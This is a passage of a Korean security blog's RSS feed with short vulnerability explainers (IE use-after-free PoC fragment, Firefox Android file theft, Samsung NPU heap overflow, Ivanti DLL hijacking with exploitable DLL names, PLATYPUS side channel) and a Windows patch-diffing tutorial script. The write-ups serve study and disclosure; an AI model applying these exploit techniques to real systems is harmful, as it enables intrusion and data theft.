class="hljs-built_in">Date</span>.now() - start &lt; <span class="hljs-number">200</span>) &#123;&#125;        <span class="hljs-keyword">return</span> <span class="hljs-number">0x1337</span>;    &#125;    flag = <span class="hljs-number">1</span>;&#125;;pwn(<span class="hljs-number">0</span>, obj);</code></pre></p></details><p>두 번째 인자를 <code>obj</code>로 <code>pwn</code> 함수를 호출하면 item을 TypedArray로 변환할 때 <code>Js::JavascriptConversion::ToNumber()</code>가 호출되어 callback 함수가 두 번 호출됩니다. 첫 번째 호출에는 <code>flag == 0</code>이므로 ArrayBuffer가 neutering 되지 않지만 두 번째 호출에서 ArrayBuffer가 neutering 됩니다. 두 번째 호출에서는 ArrayBuffer가 detach 되었는지 검사하지 않으므로 uaf가 발생합니다.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
      
      <category domain="https://hackyboiz.github.io/tags/idioth/">idioth</category>
      
      <category domain="https://hackyboiz.github.io/tags/use-after-free/">use after free</category>
      
      <category domain="https://hackyboiz.github.io/tags/internet-explorer/">internet explorer</category>
      
      
      <comments>https://hackyboiz.github.io/2020/11/19/idioth/2020-11-19/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2020-15647: website stealing files from device</title>
      <link>https://hackyboiz.github.io/2020/11/18/fabu1ous/2020-11-18/</link>
      <guid>https://hackyboiz.github.io/2020/11/18/fabu1ous/2020-11-18/</guid>
      <pubDate>Wed, 18 Nov 2020 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://medium.com/@kanytu/firefox-and-how-a-website-coul</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://medium.com/@kanytu/firefox-and-how-a-website-could-steal-all-of-your-cookies-581fe4648e8d">Firefox: How a website could steal all your cookies</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Firefox Fennec v68.9.0</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Firefox Fennec에서 Arbitrary local file access 취약점(CVE-2020–15647)이 발견되었습니다. 이를 악용한 해커의 웹 사이트에 접속하면 핸드폰의 파일을 탈취당할 수 있습니다.</p><p>안드로이드용 <code>Firefox Content Provider</code>의 misconfigure로 인해 발생하는 취약점으로 Firefox에서 접근할 수 있는 모든 파일을 웹페이지가 읽을 수 있고 해커의 웹 서버로 내용을 전송할 수 있습니다. 취약점이 발생하는 이유는 다음과 같습니다.</p><ol><li><code>content://</code> URI로 파일을 열면 파일명을 바꾸지 않고 cache 한 뒤 그곳으로 redirect 합니다.</li><li><a href="https://developer.android.com/training/secure-file-sharing/setup-sharing">file content provider</a>의 공유 가능 디렉터리가 root-path로 설정돼있습니다.</li></ol><p>브라우저는 로컬 html 파일을 열 때 <code>content://</code> URI를 사용합니다. victim device에서 탈취하고자 하는 파일(이하 target)과 동일한 이름의 악성 html 파일을 업로드하고 실행하면 Firefox가 파일명을 유지한 채로 cache 합니다. 악성 html 파일은 브라우저가 target을 <code>content://</code>로 열게 하고 기존에 cache 된 파일이 target의 내용으로 overwrite 됩니다. 악성 html이 이를 파싱해 해커의 웹 서버로 전송할 수 있습니다.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
      
      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
      
      <category domain="https://hackyboiz.github.io/tags/android/">android</category>
      
      <category domain="https://hackyboiz.github.io/tags/firefox/">firefox</category>
      
      
      <comments>https://hackyboiz.github.io/2020/11/18/fabu1ous/2020-11-18/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] Samsung Neural Processing Unit memory corruption in shared memory parsing</title>
      <link>https://hackyboiz.github.io/2020/11/17/l0ch/2020-11-17/</link>
      <guid>https://hackyboiz.github.io/2020/11/17/l0ch/2020-11-17/</guid>
      <pubDate>Tue, 17 Nov 2020 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://bugs.chromium.org/p/project-zero/issues/detail?id</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2073">Samsung NPU (Neural Processing Unit) memory corruption in shared memory parsing</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Samsung’s Exynos-based devices (including Neural Processing Unit)</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>삼성의 엑시노스 모바일 프로세서에 포함된 NPU(Neural Processing Unit)는 머신러닝 연산에 사용됩니다. 이러한 NPU의 Neural Network Feature Maps를 패키징하는데 사용되는 <code>NCP</code> 구조체의 입력 값 검증을 하지 않아 memory corruption이 발생하는 취약점이 발견되었습니다.</p><p>Convolution Neural Network Feature Maps(IFM / OFM)을 패키징하는 <code>npu_session_s_graph</code> 에서는 먼저<code>__get_session_info</code> 를 호출해 사용자 영역 ION 메모리 버퍼를 커널 메모리에 매핑합니다.</p><blockquote><p>ION - process 간 메모리 공유를 위한 메모리 할당자</p></blockquote><p>그리고 <code>__config_sesison_info</code>를 호출해 매핑된 메모리를 파싱하는데, 아래와 같은 과정에서 취약점을 트리거할 수 있습니다.</p><ol><li><code>__pilot_parsing_ncp</code> 에서 <code>temp_IFM_av</code> 버퍼의 크기는 사용자 영역 공유 메모리에서 가져온  <code>ncp-&gt; memory_vector_cnt</code> 을 사용해 먼저 계산됩니다.</li><li>TOCTOU 버그를 트리거해 사용자 영역에서 <code>ncp-&gt; memory_vector_cnt</code> 의 값을 더 큰 값으로 변경합니다.</li><li>이후 <code>__second_parsing_ncp</code> 에서 <code>ncp-&gt; memory_vector_cnt</code> 를 다시 읽어 <code>temp_IFM_av</code> 버퍼에 복사합니다.</li><li>2단계에서 큰 값으로 변경된 <code>ncp-&gt; memory_vector_cnt</code> 로 인해 <code>temp_IFM_av</code> 버퍼의 사이즈보다 더 많은 값을 복사하게 되고 이때 bounds check를 하지 않아 heap buffer overflow가 발생합니다.</li></ol><p>해당 취약점을 이용하면 커널 스레드 스택을 포함해 vmap의 커널 버퍼 범위를 벗어나 데이터를 쓸 수 있습니다.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/samsung/">samsung</category>
      
      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
      
      <category domain="https://hackyboiz.github.io/tags/npu/">npu</category>
      
      <category domain="https://hackyboiz.github.io/tags/neural-processing-unit/">neural processing unit</category>
      
      <category domain="https://hackyboiz.github.io/tags/heap-buffer-overflow/">heap buffer overflow</category>
      
      <category domain="https://hackyboiz.github.io/tags/exynos/">exynos</category>
      
      <category domain="https://hackyboiz.github.io/tags/toctou/">toctou</category>
      
      <category domain="https://hackyboiz.github.io/tags/shared-memory/">shared memory</category>
      
      
      <comments>https://hackyboiz.github.io/2020/11/17/l0ch/2020-11-17/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] Two Privilege Escalation Vulnerability in Ivanti Unified Endpoint Manager</title>
      <link>https://hackyboiz.github.io/2020/11/16/idioth/2020-11-16/</link>
      <guid>https://hackyboiz.github.io/2020/11/16/idioth/2020-11-16/</guid>
      <pubDate>Mon, 16 Nov 2020 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://labs.jumpsec.com/detecting-known-dll-hijacking-an</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://labs.jumpsec.com/detecting-known-dll-hijacking-and-named-pipe-token-impersonation-attacks-with-sysmon/">Detecting known DLL hijacking and named pipe token impersonation attacks with Sysmon</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Ivanti Unified Endpoint Manager &lt;= 2020.1.1</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p><strong>CVE-2020-13770: Named pipe token impersonation</strong></p><p>해당 취약점은 프로세스가 named pipe object를 열 때 보안 attribute가 부적절하여 발생한 취약점입니다. </p><p><code>CreateFile</code>의 <code>dwFlagsAndAttributes</code> 인자가 아래와 같은 attribute일 때 취약점이 발생합니다.</p><ul><li>SECURITY_DELEGATION</li><li>SECURITY_IMPERSONATION</li></ul><p>위의 두 attribute 중 하나로 named pipe를 열면 서버는 클라이언트 토큰을 얻고 추후 access check에 사용합니다. pipe 서버는 pipe 클라이언트의 권한, security context 등을 사용할 수 있으므로 서버보다 클라이언트의 권한이 높으면 서버는 권한 상승을 할 수 있습니다.</p><p><strong>CVE-2020-13771: DLL search order hijacking</strong></p><p>해당 취약점은 윈도우의 <a href="https://docs.microsoft.com/ko-kr/windows/win32/dlls/dynamic-link-library-search-order">DLL Search Order</a>를 이용한 취약점입니다. <code>SafeDllSearchMode</code> 설정에 관계없이 프로세스가 DLL 파일을 찾지 못하면 환경 변수 PATH에서 파일을 찾습니다. 해커가 환경 변수에 등록된 폴더에 조작된 DLL 파일을 배치하면 취약한 프로세스가 해당 DLL을 로드하고 그 프로세스의 context로 <code>DllMain</code>이 실행되어 권한상승을 할 수 있습니다. 해당 프로그램에서 악용할 수 있는 dll 파일은 아래와 같습니다.</p><ul><li>ldprofileui.dll</li><li>wfapi.dll</li><li>DMIAPI32.DLL</li><li>logonsrv.dll</li><li>OOBCredentials.dll</li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
      
      <category domain="https://hackyboiz.github.io/tags/eop/">eop</category>
      
      <category domain="https://hackyboiz.github.io/tags/idioth/">idioth</category>
      
      <category domain="https://hackyboiz.github.io/tags/lpe/">lpe</category>
      
      <category domain="https://hackyboiz.github.io/tags/dll-hijacking/">dll hijacking</category>
      
      <category domain="https://hackyboiz.github.io/tags/dll-search-order/">dll search order</category>
      
      <category domain="https://hackyboiz.github.io/tags/named-pipe/">named pipe</category>
      
      <category domain="https://hackyboiz.github.io/tags/impersonation-attack/">impersonation attack</category>
      
      
      <comments>https://hackyboiz.github.io/2020/11/16/idioth/2020-11-16/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] Windows Patch Diffing 맛보기 Part 1</title>
      <link>https://hackyboiz.github.io/2020/11/15/l0ch/windows-patch-diffing-part1/</link>
      <guid>https://hackyboiz.github.io/2020/11/15/l0ch/windows-patch-diffing-part1/</guid>
      <pubDate>Sun, 15 Nov 2020 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;안녕하세요! L0ch입니다. 저번 &lt;a href=&quot;https://hackyboiz.github.io/2020/11/01/l0ch/cve-2020-1464/&quot;&gt;GlueBall 취약점&lt;/a&gt; 글 썼을 때 디핑 할 버전별 바이너리를 구하다가 멘탈이 파</description>
        
      
      
      
      <content:encoded><![CDATA[<p>안녕하세요! L0ch입니다. 저번 <a href="https://hackyboiz.github.io/2020/11/01/l0ch/cve-2020-1464/">GlueBall 취약점</a> 글 썼을 때 디핑 할 버전별 바이너리를 구하다가 멘탈이 파쇄기에 갈린 종이마냥 갈릴 뻔했죠?</p><p>생각해보니까 괜히 Diffing 하겠다고 건드렸다가 X고생했는데 이대로 가만히 있으면 왠지 억울하자나여. 그래서 이 참에 좀 쉽게 쉽게 갈 수 있는 방법을 찾느라 방황하던 중 엄청난 글을 발견하게 되는데..</p><p><a href="https://wumb0.in/extracting-and-diffing-ms-patches-in-2020.html">Extracting and Diffing Windows Patches in 2020</a></p><p>이거 완전 나를 위한 글이잖아??ㅎ</p><p><img src="/2020/11/15/l0ch/windows-patch-diffing-part1/1.png"></p><p>그래서! 바로 정리에 들어갔죠. 앞으로 할 삽질은 꿈에도 모른 채 ㅋㅋ 아</p><h1 id="Diffing-이-뭔데"><a href="#Diffing-이-뭔데" class="headerlink" title="Diffing 이 뭔데?"></a>Diffing 이 뭔데?</h1><p>간단하게 Binary Diffing이 뭔지 짚고 넘어가 봅시다!</p><blockquote><p>Diffing 은 일반적으로 컴퓨터에서 두 개 파일의 차이를 보여주는 용어다. (Ex : git diff - Git의 소스코드 difference 확인) 바이너리 분석 기법(Binary Diffing)으로도 쓰이는데, 패치 또는 업데이트된 바이너리와 기존 바이너리를 비교해서 어떤 코드가 변경되었는지, 어떤 함수가 추가되고 제거되었는지 등 버전 별 바이너리의 차이점을 알 수 있는 분석 기법이다.</p></blockquote><p>한마디로 얘네가 뭐를 어떻게 패치했나~ 바뀐 부분만 쓱 둘러보는 분석 기법입니다. 별 거 없어 보이지만 Diffing을 하면서 패치로 인해 발생한 새로운 취약점이나, 기존 취약점에 대해 적용한 패치를 우회하는 새로운 방법 등을 효율적으로 찾을 수 있습니다. 오늘은 앞서 말한 것처럼 Windows Update 패치를 추출하고 추출한 업데이트 파일을 이용해 Diffing을 진행해 볼게요.</p><h1 id="Windows-Update-Package"><a href="#Windows-Update-Package" class="headerlink" title="Windows Update Package"></a>Windows Update Package</h1><h2 id="Microsoft-Update-Catalog"><a href="#Microsoft-Update-Catalog" class="headerlink" title="Microsoft Update Catalog"></a>Microsoft Update Catalog</h2><p>윈도우는 업데이트 패키지를 배포해 실행하는 방식으로 패치를 합니다.</p><p>Windows 10 기준으로 버전 별로 나누어 배포하고 있으며 오늘은 다음 환경에서 진행합니다.</p><pre><code class="hljs markdown">Windows 10 ver1903, 64bit</code></pre><p>버전에 따라 받아야 하는 업데이트 파일이 다르니 참고하시면 됩니다!</p><p>기본적으로 윈도우는 자동 업데이트 방식을 사용하지만 윈도우 카탈로그에서 독립 실행형 패치 패키지를 받아 수동 설치할 수도 있습니다.</p><p>윈도우 카탈로그 : <a href="https://www.catalog.update.microsoft.com/Home.aspx">https://www.catalog.update.microsoft.com/Home.aspx</a></p><p>Windows 카탈로그는 다음과 같은 형식의 검색 기능을 제공합니다.</p><pre><code class="hljs lisp">YYYY-MM release-number (<span class="hljs-name">x86</span><span class="hljs-name">|x64|</span><span class="hljs-name">ARM64</span>) cumulative</code></pre><p>제 윈도우는 1903, 64bit 이므로 8월 업데이트를 찾기 위해 아래 키워드로 검색을 해볼게요.</p><pre><code class="hljs angelscript"><span class="hljs-number">2020</span><span class="hljs-number">-08</span> <span class="hljs-number">1903</span> x64 cumulative</code></pre><p><img src="/2020/11/15/l0ch/windows-patch-diffing-part1/2.png"></p><p>검색을 하면 이렇게 업데이트 목록들이 주르륵 뜨는데, Diffing 하길 원하는 파일이 패치된 업데이트 항목을 받으면 됩니다. 전 <code>KB4565351</code> 을 받도록 할게요.</p><h1 id="Extract-Update-Package"><a href="#Extract-Update-Package" class="headerlink" title="Extract Update Package"></a>Extract Update Package</h1><p>업데이트 파일을 다운로드하면 <code>msu</code> 확장명의 업데이트 패키지를 받을 수 있습니다.</p><p>이 패키지에서 파일들을 추출해내면 됩니다.</p><h2 id="Extract-msi"><a href="#Extract-msi" class="headerlink" title="Extract msi"></a>Extract msi</h2><p>PowerShell에서 <code>expand.exe -F:* &quot;[msu file name]&quot; .\\ext\\</code> 명령어로 패치 컨텐츠들을 추출하면 아래 사진과 같이 ext 폴더 안에 추출된 파일들이 있는 걸 볼 수 있습니다~</p><p><img src="/2020/11/15/l0ch/windows-patch-diffing-part1/3.png"></p><p>cab파일이 보이는군요, 이것도  역시 expand로 쓱싹 추출하도록 하죠!</p><p><img src="/2020/11/15/l0ch/windows-patch-diffing-part1/4.png"></p><p>..?? 왜 아무 반응이 없지..?</p><p>아 왜 안되나 했더니 좀 오래 걸리나 보군요 기다려 봅시다 ㅎ</p><p><img src="/2020/11/15/l0ch/windows-patch-diffing-part1/5.png"></p><p>그렇게 <del>2000년 같은</del> 한 시간이 지나고.. 한 20분 정도 기다리다가 포기하고 저녁 먹고 오니까 끝나 있네요?</p><p>아니 뭐 추출 얼마나 한다고 이렇게 오래 걸리냐 하고 추출한 파일 개수를 세 봤는데</p><p><img src="/2020/11/15/l0ch/windows-patch-diffing-part1/6.png"></p><p>?? 3만개요?</p><p><img src="/2020/11/15/l0ch/windows-patch-diffing-part1/7.png"></p><p><em>아니 미친 ㅎㅎ</em></p><p>누적 업데이트 패키지라 지금까지의 업데이트들이 모두 포함되어 있어 이렇게 많다고 하네요…? 추출은 밥때 맞춰서 돌려놓고 밥 먹고 오면 될 것 같습니다ㅋㅋ;</p><h2 id="Extracted-files"><a href="#Extracted-files" class="headerlink" title="Extracted files"></a>Extracted files</h2><p><code>tree /F &gt;&gt; extract.txt</code> 명령어로 어떤 파일들이 추출 되었는지 트리 구조로 확인해 보도록 하죠!</p><p><img src="/2020/11/15/l0ch/windows-patch-diffing-part1/8.png"></p><p>다양한 형식의 파일, 폴더들이 추출된 것을 볼 수 있네요.</p><ol><li><p>폴더 유형</p><p>접두어로 아키텍처가 붙음</p><ul><li>amd64, x86, wow64, msil</li></ul></li><li><p>파일 유형</p><ul><li>manie</li><li>cat : 보안 카탈로그</li><li>mum : 카탈로그 파일과 쌍을 이루며 메타 데이터가 포함됨</li></ul></li></ol><p>그런데.. 각 패치 폴더 안에 f랑 r 폴더가 있고, 이 안에 각각 같은 이름의 바이너리가 보이는데, 이게 뭘까요..?</p><p><img src="/2020/11/15/l0ch/windows-patch-diffing-part1/9.png"></p><p>f, r 각 폴더는 Differential 폴더로, 세 가지 유형이 있습니다.</p><ul><li>f: forward differential</li><li>r: reverse differential</li><li>n: null differential</li></ul><p>이들은 기본 버전에서 변경될 업데이트 파일과의 차이만큼의 내용을 담고 있는 파일입니다. 이 부분은 중요한 내용이라 나중에 다시 짚어 보도록 할 테니, 꼭 기억해 두세요!</p><h2 id="WinSxS"><a href="#WinSxS" class="headerlink" title="WinSxS"></a>WinSxS</h2><p>Windows는 Windows와 WinSxS를 통해 바이너리뿐만 아니라 모든 종류의 파일을 업데이트할 수 있습니다.</p><p>WinSxS는 manifest를 참조해 패치하며 manifest에는 패치 적용 방법, 결과 파일의 권한, 설정할 레지스트리 키 등 업데이트에 대한 전반적인 리스트 정보가 있어요. 간단하게 확인해 볼까요?</p><p><img src="/2020/11/15/l0ch/windows-patch-diffing-part1/10.png"></p><p>Windows-Gaming-XboxLive-Storage-Service-Component에 대한 manifest 정보를 조회한 결과입니다.</p><p>differential 폴더인 f, r가 있고, 각각에 패치될 dll과 exe 바이너리가 있는 걸 확인할 수 있어요.</p><h1 id="추출-자동화"><a href="#추출-자동화" class="headerlink" title="추출 자동화"></a>추출 자동화</h1><p>그런데 말입니다. 다 좋은데.. 추출한 파일 리스트를 좀 보려고 했더니 아키텍처 별로 분류도 없고 뒤죽박죽 개판이라 짜증 나려고 하네,,^^</p><blockquote><p>날로 먹기 좋아하는 L0ch는 바로 추출/분류 자동화 스크립트를 짜기로 합니다. 역시 원 게시글에도 스크립트가 있군요!<br>기쁜 표정으로 스크립트를 살펴본 L0ch의 표정이 어두워집니다. 무슨 일이죠? 아 ! 파워쉘로 짠 스크립트네요!<br>저런… 애석하게도 L0ch는 파워쉘을 해본 적이 없습니다. 눈물을 머금고 파이썬으로 새로 작성하는 방법밖에 없겠군요.</p></blockquote><pre><code class="hljs python"><span class="hljs-comment">#F**k PowerShell </span><span class="hljs-keyword">import</span> os<span class="hljs-keyword">import</span> subprocess<span class="hljs-keyword">import</span> timeps_path = <span class="hljs-string">&#x27;C:/Windows/System32/WindowsPowerShell/v1.0/powershell.exe &#x27;</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">create_dir</span>(<span class="hljs-params">dir</span>):</span><span class="hljs-keyword">try</span>:<span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span>(os.path.isdir(dir)):os.makedirs(os.path.join(dir))<span class="hljs-keyword">except</span> OSError <span class="hljs-keyword">as</span> e:<span class="hljs-keyword">if</span> e.errno != errno.EEXIST:print(<span class="hljs-string">&quot;Failed to create directory&quot;</span>)<span class="hljs-keyword">raise</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">extract_msu</span>():</span>cmd = <span class="hljs-string">&#x27;expand.exe -F:* &quot;*.msu&quot; ./ext/&#x27;</span>subprocess.run(ps_path + cmd, shell=<span class="hljs-literal">True</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">extract_cab</span>():</span>cmd = <span class="hljs-string">&#x27;expand.exe -F:* &quot;./ext/Windows*.cab&quot; ./patch/&#x27;</span>subprocess.run(ps_path + cmd, shell=<span class="hljs-literal">True</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">move_files</span>(<span class="hljs-params">dir, filename</span>):</span><span class="hljs-keyword">try</span>:os.popen(<span class="hljs-string">&#x27;move ./patch/&#x27;</span>+filename+<span class="hljs-string">&#x27; ./&#x27;</span>+dir)<span class="hljs-keyword">except</span>:print(<span class="hljs-string">&quot;Failed to move file&quot;</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">classification</span>():</span>output = os.popen(<span class="hljs-string">&#x27;dir /ad /b patch&#x27;</span>).read()patch_list = output.split(<span class="hljs-string">&#x27;\\n&#x27;</span>)print(<span class="hljs-string">&quot;File classification&quot;</span>)<span class="hljs-keyword">for</span> idx, patch <span class="hljs-keyword">in</span> enumerate(patch_list):<span class="hljs-keyword">if</span> idx + <span class="hljs-number">1</span> % <span class="hljs-number">5</span> == <span class="hljs-number">0</span>:print(<span class="hljs-string">&quot;(&quot;</span>+str(idx)+<span class="hljs-string">&quot;/&quot;</span> + str(len(patch_list))+<span class="hljs-string">&quot;)&quot;</span>)time.sleep(<span class="hljs-number">0.01</span>)platform = patch[:<span class="hljs-number">5</span>]<span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;msil&#x27;</span> <span class="hljs-keyword">in</span> platform:move_files(<span class="hljs-string">&#x27;MSIL&#x27;</span>, patch)<span class="hljs-keyword">elif</span> <span class="hljs-string">&#x27;wow64&#x27;</span> <span class="hljs-keyword">in</span> platform:move_files(<span class="hljs-string">&#x27;WOW64&#x27;</span>, patch)<span class="hljs-keyword">elif</span> <span class="hljs-string">&#x27;amd64&#x27;</span> <span class="hljs-keyword">in</span> platform:move_files(<span class="hljs-string">&#x27;x64&#x27;</span>, patch)<span class="hljs-keyword">elif</span> <span class="hljs-string">&#x27;x86&#x27;</span> <span class="hljs-keyword">in</span> platform:move_files(<span class="hljs-string">&#x27;x86&#x27;</span>, patch)print(<span class="hljs-string">&quot;(&quot;</span>+str(idx + <span class="hljs-number">1</span>)+<span class="hljs-string">&quot;/&quot;</span> + str(len(patch_list))+<span class="hljs-string">&quot;)&quot;</span>)<span class="hljs-comment"># JUNK</span>os.popen(<span class="hljs-string">&#x27;move patch JUNK&#x27;</span>)os.popen(<span class="hljs-string">&#x27;cd ext &amp;&amp; move *.txt ../&#x27;</span>)os.popen(<span class="hljs-string">&#x27;echo y | rmdir /s ext &gt; nul&#x27;</span>)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:dir_list = [<span class="hljs-string">&#x27;ext&#x27;</span>,<span class="hljs-string">&#x27;patch&#x27;</span>,<span class="hljs-string">&#x27;MSIL&#x27;</span>,<span class="hljs-string">&#x27;WOW64&#x27;</span>,<span class="hljs-string">&#x27;x64&#x27;</span>,<span class="hljs-string">&#x27;x86&#x27;</span>]<span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> dir_list:create_dir(d)extract_msu()extract_cab()classification()print(<span class="hljs-string">&quot;Done&quot;</span>)time.sleep(<span class="hljs-number">3</span>)</code></pre><p>PowerShell 써보려고 했는데 10분만에 때려치고 걍 익숙한 파이썬 썼습니다ㅋㅋ. 익숙한 게 최고야</p><p><img src="/2020/11/15/l0ch/windows-patch-diffing-part1/11.png"></p><blockquote><p>파이썬 최고다악!! </p></blockquote><p><img src="/2020/11/15/l0ch/windows-patch-diffing-part1/12.png"></p><p>msu에서 cab파일을 추출하고, 위 사진과 같이 cab에서 추출한 파일들을 각 아키텍처 폴더에 분류했습니다.<br>.manifest와 .mum, .cat 파일은 들여다볼 일이 거의 없기 때문에 JUNK로 분류를 했구요.</p><p>이렇게 분류해서 정리된 모습을 보니 편안하군요. 역시 사람은 정리를 하고 살아야 돼<br>아 그래서 제 방은 정리하고 사냐구요? 그럴 리가요..?</p><p>분량 조절 실패로.. 다음 글에서는 패치 유형을 알아보고, 본격적으로 Diffing을 해볼게요!</p><p><img src="/2020/11/15/l0ch/windows-patch-diffing-part1/13.jpg"></p><p>안녕히 계세요 여러분! 전 이 세상의 모든 굴레와 속박을 벗어 던지고 제 행복을 찾아 떠납니다! (대충 술 먹으러 간다는 말)</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/windows/">windows</category>
      
      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
      
      <category domain="https://hackyboiz.github.io/tags/diffing/">diffing</category>
      
      <category domain="https://hackyboiz.github.io/tags/patch-tuesday/">patch tuesday</category>
      
      <category domain="https://hackyboiz.github.io/tags/patch-extract/">patch extract</category>
      
      
      <comments>https://hackyboiz.github.io/2020/11/15/l0ch/windows-patch-diffing-part1/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] Software-based Power Side-Channel Attack on x86</title>
      <link>https://hackyboiz.github.io/2020/11/14/fabu1ous/2020-11-14/</link>
      <guid>https://hackyboiz.github.io/2020/11/14/fabu1ous/2020-11-14/</guid>
      <pubDate>Sat, 14 Nov 2020 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://platypusattack.com/&quot;&gt;PLATYPUS&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;Tar</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://platypusattack.com/">PLATYPUS</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Xen</p><p>Intel Processor 다수</p><p>Linux</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>side-channel 정보(power consumption / electro magnetic emission)를 이용해 시스템의 operation 및 data를 유추하는 공격 방법은 세계 2차 대전 때부터 존재했습니다. 지금까지 2가지 한계가 존재했는데 다음과 같습니다.</p><ol><li>고성능의 Desktop이나 server용 CPU 보단 임베디드 마이크로 컨트롤러를 타겟으로 잡음.</li><li>오실로스코프 등을 이용한 하드웨어 기반 공격이 많았고, 소프트웨어 기반 공격의 x86 적용은 크게 성공적이지 못함. ex) RSA key 복구 시도가 2번 있었지만 실패.</li></ol><p>PLATYPUS attack은 소프트웨어 기반 side-channel 공격입니다. Intel RAPL interface에 접근해 power consumption에 대한 정보 축적 후 x86 시스템을 타겟으로 다음과 같은 행위를 할 수 있습니다.</p><ol><li>instruction 분별, control flow monitoring</li><li>AES-NI key 추출(26시간 이내)</li><li>RSA key 복구(100분 이내)</li><li>KASLR 무력화(20초 이내)</li></ol><p>Intel RARL(Running Average Power Limit)의 데이터에 누구나 접근할 수 있고 악용할 수 있습니다. 따라서 power monitoring interface들의 접근권한이 패치됐습니다.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://seclists.org/oss-sec/2020/q4/109">https://seclists.org/oss-sec/2020/q4/109</a></p><p><a href="https://seclists.org/oss-sec/2020/q4/110">https://seclists.org/oss-sec/2020/q4/110</a></p><p><a href="https://www.intel.com/content/www/us/en/security-center/advisory/intel-sa-00389.html">https://www.intel.com/content/www/us/en/security-center/advisory/intel-sa-00389.html</a></p><p><a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=949dd0104c496fa7c14991a23c03c62e44637e71">https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=949dd0104c496fa7c14991a23c03c62e44637e71</a></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
      
      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
      
      <category domain="https://hackyboiz.github.io/tags/linux/">linux</category>
      
      <category domain="https://hackyboiz.github.io/tags/side-channel-attack/">side-channel attack</category>
      
      <category domain="https://hackyboiz.github.io/tags/intel/">intel</category>
      
      
      <comments>https://hackyboiz.github.io/2020/11/14/fabu1ous/2020-11-14/#disqus_thread</comments>
      
    </item>
    
    <item>
